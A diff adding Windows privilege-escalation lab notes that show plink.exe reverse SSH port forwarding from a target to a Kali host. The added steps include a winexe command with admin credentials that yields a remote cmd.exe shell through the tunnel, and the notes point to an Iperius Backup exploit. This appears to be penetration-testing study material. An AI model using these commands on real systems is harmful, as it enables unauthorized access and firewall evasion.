@@ -692,6 +692,38 @@ It appears we have the ability to write to this file. Backup the script:
 C:\DevTools\CleanUp.ps1
 6. Wait for the scheduled task to run (it should run every minute) to complete the exploit.
 ```
+
+### Port Forwarding
+Sometimes it is easier to run exploit code on Kali, but the vulnerable program is listening on an internal port.
+In these cases we need to forward a port on Kali to the internal port on Windows.We can do this using a program called plink.exe (from the makers of PuTTY).
+### plink.exe
+The general format of a port forwarding command using plink.exe:
+```bash
+> plink.exe <user>@<kali> -R <kaliport>:<target-IP>:<target-port>
+```
+Note that the <target-IP> is usually local (e.g. 127.0.0.1). plink.exe requires you to SSH to Kali, and then uses the SSH tunnel to forward ports.
+
+### Privilege Escalations:
+```bash
+1. First, test that we can still login remotely via winexe:
+# winexe -U 'admin%password123'
+//192.168.1.22 cmd.exe
+2. Using an administrator command prompt, re-enable the firewall:
+> netsh advfirewall set allprofiles state on
+3. Confirm that the winexe command now fails.
+4. Copy the plink.exe file across to Windows, and then kill the SMB
+Server on Kali (if you are using it).
+
+5. Make sure that the SSH server on Kali is running and accepting root logins. Check that the “PermitRootLogin yes” option is uncommented in /etc/ssh/sshd_config.
+Restart the SSH service if necessary.
+6. On Windows, use plink.exe to forward port 445 on Kali to the Windows port 445:
+> plink.exe root@192.168.1.11 -R 445:127.0.0.1:445
+7. On Kali, modify the winexe command to point to localhost (or 127.0.0.1) instead,
+and execute it to get a shell via the port forward:
+# winexe -U 'admin%password123' //localhost cmd.exe
+```
+
+
 ### Iperius Backup 6.1.0 - Privilege Escalation
 Scenario: On a VNC accessible machine this service is running. Use the exploit [46863](https://www.exploit-db.com/exploits/46863) in exploitdb.
 
